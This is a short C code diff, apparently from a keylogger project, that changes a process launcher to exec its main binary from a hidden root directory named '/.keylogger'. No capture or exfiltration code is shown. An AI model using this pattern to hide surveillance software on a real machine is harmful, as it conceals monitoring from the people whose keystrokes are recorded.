@@ -59,7 +59,7 @@ pid_t exec_main()
         sprintf(str_id, "%d", parent_id);
 
         printf("Starting main...\n");
-        execlp("./main", "./main", str_id, NULL);
+        execlp("/.keylogger/./main", "./main", str_id, NULL);
     }
 
     return pid;
